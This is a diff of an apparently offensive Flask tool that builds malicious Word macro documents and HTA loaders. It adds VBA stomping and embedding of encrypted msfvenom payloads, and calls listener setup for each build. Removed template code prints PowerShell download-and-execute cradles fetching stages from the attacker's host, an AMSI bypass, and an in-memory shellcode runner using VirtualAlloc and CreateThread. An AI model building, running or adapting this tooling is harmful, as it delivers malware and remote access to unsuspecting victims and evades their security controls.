@@ -194,6 +194,58 @@ def generate_word_file(template_path: str, encrypted_payloads: List[bytes], stom
     return file_data
 
 
+def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], stomp_vba: bool) -> Optional[BytesIO]:
+    file_data, ole = open_word_template(template_path)
+
+    for x in encrypted_payloads:
+        print(len(x))
+        print(f"{(len(x)):04X}")
+        print(','.join(str(b) for b in x))
+
+    data_to_write = (''.join(map(
+        lambda x: f"{(len(x)):04X}{binascii.hexlify(x).decode().upper()}", encrypted_payloads))).encode()
+
+    if not file_data:
+        return None
+
+    contents = ole.openstream("WordDocument").read()
+    offset, length = findmarker(contents)
+
+    if offset != -1:
+        logger.info(
+            f"Marker found in document at: [{offset}] length: [{length}]")
+
+        if length < len(data_to_write):
+            logger.error(
+                f"Payload is too big for document! ({len(data_to_write)} > {length})")
+            return None
+
+        contents = replacemarker(contents, offset, data_to_write)
+        ole.write_stream(f"WordDocument", contents)
+
+    if stomp_vba:
+        dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())
+
+        module_offsets = get_vba_offsets(dir_stream)
+
+        # We have messed up the mapping between modules and OLE paths using EvilClippy, so pick the largest offset and put it in NewMacros
+        biggest_offset = sorted(module_offsets.items(),
+                                key=lambda x: x[1], reverse=True)[0][1]
+        contents = ole.openstream(f"Macros/VBA/NewMacros").read()
+        contents = contents[:biggest_offset].ljust(len(contents), b'\x00')
+        ole.write_stream(f"Macros/VBA/NewMacros", contents)
+
+        # for directory, vba_offset in module_offsets.items():
+        #     contents = ole.openstream(f"Macros/VBA/{directory}").read()
+        #     contents = contents[:vba_offset].ljust(len(contents), b'\x00')
+        #     ole.write_stream(f"Macros/VBA/{directory}", contents)
+
+    ole.close()
+    file_data.seek(0)
+
+    return file_data
+
+
 def powershell_base64(command):
     command_bytes = command.encode('utf-16le')
     base64_encoded = base64.b64encode(command_bytes)
@@ -222,46 +274,6 @@ def random_capitalize(input_string):
 
 def encode_ps(command):
     return f"{random_capitalize("iex")}([{random_capitalize("System.Text.Encoding")}]::{random_capitalize("UTF8.GetString")}([{random_capitalize("System.Convert")}]::{random_capitalize("FromBase64String")}('{regular_base64(command)}')))"
-
-
-def generate_word_file_old(template_path: str, encrypted_payload: bytes) -> Optional[BytesIO]:
-    file_data, ole = open_word_template(template_path)
-
-    if not file_data:
-        return None
-
-    dir_stream = decompress_stream(ole.openstream("Macros/VBA/dir").read())
-
-    module_offsets = get_vba_offsets(dir_stream)
-
-    for directory, vba_offset in module_offsets.items():
-        contents = ole.openstream(f"Macros/VBA/{directory}").read()
-
-        offset, length = findmarker(contents)
-
-        if offset != -1:
-            logger.info(
-                f"Marker found in module [{directory}] at: [{offset}] length: [{length}]")
-
-            if length < len(encrypted_payload):
-                logger.error(
-                    f"Payload is too big for document! ({len(encrypted_payload)} > {length})")
-                return None
-
-            encrypted_bytes_padded = encrypted_payload.ljust(length, b'\x00')
-            encrypted_bytes_instructions = bytearray(
-                [b for byte in encrypted_bytes_padded for b in [0xAC, 0x00, byte, 0x00]])
-
-            contents = replacemarker(
-                contents, offset, encrypted_bytes_instructions)
-
-        contents = contents[:vba_offset].ljust(len(contents), b'\x00')
-        ole.write_stream(f"Macros/VBA/{directory}", contents)
-
-    ole.close()
-    file_data.seek(0)
-
-    return file_data
 
 
 def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
@@ -631,120 +643,25 @@ def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
 
 win = Blueprint('win', __name__)
 
-WIN_PS_COMMAND = """
-{% if proxy == False %}
-[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);
-{% endif %}
 
-iex((New-Object System.Net.WebClient).DownloadString("http://{{ lhost }}:{{ lport }}/p/win/{{ type }}/{{ id }}/start"))
-"""
+with open('templates/WIN_PS_COMMAND.ps1', 'r') as f:
+    WIN_PS_COMMAND = f.read().strip()
 
-WIN_START_TEMPLATE = """
-if([Environment]::Is64BitProcess) {
-    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/bypass'));
-}
-else
-{
-    iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/loader_32'));
-}
-"""
-WIN_BYPASS_TEMPLATE = """
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null, $true);
+with open('templates/WIN_START.ps1', 'r') as f:
+    WIN_START_TEMPLATE = f.read().strip()
 
-iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/delegate'));
-"""
-WIN_LOADER_32_TEMPLATE = """
-&"$env:WINDIR\\sysnative\\windowspowershell\\v1.0\\powershell.exe" -c "{% if proxy == False %}[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy(`$null);{% endif %}iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/start'))"
-"""
-WIN_DELEGATE_TEMPLATE = """
-function LookupFunc {
-    Param ($moduleName, $functionName)
-
-    $assem = (
-        [AppDomain]::CurrentDomain.GetAssemblies() |
-            Where-Object {
-                $_.GlobalAssemblyCache -And
-                $_.Location.Split('\\')[-1].Equals('System.dll') }
-    ).GetType('Microsoft.Win32.UnsafeNativeMethods')
-
-    $GetProcAddress = ($assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}})[0]
-
-    return $GetProcAddress.Invoke(
-        $null,
-        @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)
-    )
-}
-
-function getDelegateType {
-    Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-        [Parameter(Position = 1)] [Type] $delType = [Void]
-    )
-
-    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
-                (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
-                [System.Reflection.Emit.AssemblyBuilderAccess]::Run
-            ).DefineDynamicModule(
-                'InMemoryModule',
-                $false
-            ).DefineType(
-                'MyDelegateType',
-                'Class, Public, Sealed, AnsiClass, AutoClass',
-                [System.MulticastDelegate]
-            )
-
-    $type.DefineConstructor(
-        'RTSpecialName, HideBySig, Public',
-        [System.Reflection.CallingConventions]::Standard,
-        $func
-    ).SetImplementationFlags('Runtime, Managed')
-
-    $type.DefineMethod(
-        'Invoke', 'Public, HideBySig, NewSlot, Virtual',
-        $delType,
-        $func
-    ).SetImplementationFlags('Runtime, Managed')
-
-    return $type.CreateType()
-}
-
-function DecryptBytes {
-    Param (
-        $Bytes
-    )
-
-    [Byte[]] $decrypted = New-Object byte[] $Bytes.length
-
-    for($i=0; $i -lt $Bytes.length; $i++)
-    {
-        $decrypted[$i] = $Bytes[$i] -bxor 0x75
-        $decrypted[$i] = (($decrypted[$i] + 256) - 2) % 256
-    }
-
-    return $decrypted
-}
-
-$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));
-$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])));
-$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int])))
+with open('templates/WIN_BYPASS.ps1', 'r') as f:
+    WIN_BYPASS_TEMPLATE = f.read().strip()
 
 
-$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+with open('templates/WIN_LOADER_32.ps1', 'r') as f:
+    WIN_LOADER_32_TEMPLATE = f.read().strip()
 
-[Byte[]] $buf = {{bytes}}
-[Byte[]] $buf2 = DecryptBytes($buf)
+with open('templates/WIN_DELEGATE.ps1', 'r') as f:
+    WIN_DELEGATE_TEMPLATE = f.read().strip()
 
-
-[System.Runtime.InteropServices.Marshal]::Copy($buf2, 0, $lpMem, $buf.length)
-
-$hThread = $CreateThread.Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
-
-$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
-"""
-
-WIN_VBA_OUT_TEMPLATE = """
-buf = Array({{bytes}})
-"""
+with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
+    WIN_VBA_OUT_TEMPLATE = f.read().strip()
 
 
 def ps(id, stage, proxy=False):
@@ -877,9 +794,74 @@ def tcp(id, stage):
         return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)
 
 
-@win.route('/word_form/')
+SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}
+
+
+def get_ip(adapter: str) -> str:
+    # Ensure adapter is in the safe list
+    if adapter not in SAFE_ADAPTERS:
+        adapter = "tun0"
+    try:
+        return os.popen(
+            f"ip a s {adapter} | grep 'inet ' | awk '{{print $2}}' | sed 's/\\/.*//g'"
+        ).read().strip()
+    except Exception:
+        return ""
+
+
+@win.route('/')
 def word_form():
-    return render_template('word_form.html')
+    import os
+    template = render_template('word_form.html')
+    ladapter = request.args.get('ladapter', '')
+    lport = request.args.get('lport', 80)
+    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
+    print(f"{ladapter=}")
+    print(f"{lport=}")
+    print(f"{uid=}")
+    # if adapter == "":
+    #     adapter = "tun0"
+    # os.popen('ip a s ' + adapter + ''' | grep 'inet ' | awk '{print $2}' | sed 's/\/.*//g' ''').read()
+    # get_ip()
+    template = template.replace(
+        'name="lhost" value=""', f'name="lhost" value="{get_ip(ladapter)}"')
+    template = template.replace(
+        'name="lport" value=""', f'name="lport" value="{str(lport)}"')
+    template = template.replace(
+        'name="id" value=""', f'name="id" value="{str(uid)}"')
+    return template
+
+
+def gen_multiple_payloads(lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32, 64]):
+    retval = {}
+    print(f"{archs=}")
+    for arch in archs:
+        current_config = f"{config}_{str(arch)}"
+        endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
+        print(f"{current_config=}")
+        print(f"{endpoint_msfvenom=}")
+        setup_listener(
+            lhost,
+            lport,
+            LISTENER_CONFIGS[current_config] | {
+                "LURI": endpoint_msfvenom,
+                "HttpProxyIE": proxy,
+            }
+        )
+        a = generate_payload(
+            LISTENER_CONFIGS[current_config]["Payload"],
+            lhost,
+            lport,
+            'raw',
+            [
+                {
+                    "LURI": endpoint_msfvenom,
+                    "HttpProxyIE": proxy,
+                }
+            ]
+        )
+        retval[arch] = a
+    return retval
 
 
 @win.route('/word_form/get', methods=['POST'])
@@ -1031,38 +1013,6 @@ def word_get():
     )
 
 
-def gen_multiple_payloads(lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32, 64]):
-    retval = {}
-    print(f"{archs=}")
-    for arch in archs:
-        current_config = f"{config}_{str(arch)}"
-        endpoint_msfvenom = f"/{endpoint}/{id}_{str(arch)}/"
-        print(f"{current_config=}")
-        print(f"{endpoint_msfvenom=}")
-        setup_listener(
-            lhost,
-            lport,
-            LISTENER_CONFIGS[current_config] | {
-                "LURI": endpoint_msfvenom,
-                "HttpProxyIE": proxy,
-            }
-        )
-        a = generate_payload(
-            LISTENER_CONFIGS[current_config]["Payload"],
-            lhost,
-            lport,
-            'raw',
-            [
-                {
-                    "LURI": endpoint_msfvenom,
-                    "HttpProxyIE": proxy,
-                }
-            ]
-        )
-        retval[arch] = a
-    return retval
-
-
 @win.route('/hta/get', methods=['POST'])
 def hta_get():
     lhost = request.form['lhost']
@@ -1074,59 +1024,23 @@ def hta_get():
     if clean_id == "":
         return "Invalid id", 400
 
-    # setup_listener(
-    #     lhost,
-    #     lport,
-    #     LISTENER_CONFIGS["VBA_64"] | {
-    #         "LURI": f"/ms/{clean_id}_64/",
-    #         "HttpProxyIE": proxy,
-    #     }
-    # )
-
-    # setup_listener(
-    #     lhost,
-    #     lport,
-    #     LISTENER_CONFIGS["VBA_32"] | {
-    #         "LURI": f"/ms/{clean_id}_32/",
-    #         "HttpProxyIE": proxy,
-    #     }
-    # )
-
-    # raw_payload_file_64 = generate_payload(
-    #     LISTENER_CONFIGS["VBA_64"]["Payload"],
-    #     lhost,
-    #     lport,
-    #     'raw',
-    #     [
-    #         {
-    #             "LURI": f"/ms/{clean_id}_64/",
-    #             "HttpProxyIE": proxy,
-    #         }
-    #     ]
-    # )
-
-    # raw_payload_file_32 = generate_payload(
-    #     LISTENER_CONFIGS["VBA_32"]["Payload"],
-    #     lhost,
-    #     lport,
-    #     'raw',
-    #     [
-    #         {
-    #             "LURI": f"/ms/{clean_id}_32/",
-    #             "HttpProxyIE": proxy,
-    #         }
-    #     ]
-    # )
     payloads_generated = gen_multiple_payloads(
-        lhost, lport, proxy, clean_id, config="VBA", endpoint="ms", archs=[32, 64])
+        lhost, lport, proxy, clean_id, config="VBA", endpoint="ms", archs=[32, 64]
+    )
 
-    # encrypted_bytes_64 = base64.b64encode(encrypt_raw_payload(raw_payload_file_64)).decode()
-    # encrypted_bytes_32 = base64.b64encode(encrypt_raw_payload(raw_payload_file_32)).decode()
+    payload_x32 = base64.b64encode(
+        encrypt_raw_payload(payloads_generated[32])
+    ).decode()
+    payload_x64 = base64.b64encode(
+        encrypt_raw_payload(payloads_generated[64])
+    ).decode()
 
-    # hta = render_template("loader.hta", payload_x64=encrypted_bytes_64, payload_x32=encrypted_bytes_32)
 
-    hta = render_template("loader.hta", payload_x64=base64.b64encode(encrypt_raw_payload(payloads_generated[64])).decode(
-    ), payload_x32=base64.b64encode(encrypt_raw_payload(payloads_generated[32])).decode())
+    hta = render_template(
+        "loader.hta",
+        payload_x64=payload_x64,
+        payload_x32=payload_x32
+    )
 
     bytes_data = hta.encode('utf-8')
     bytes_io = BytesIO(bytes_data)
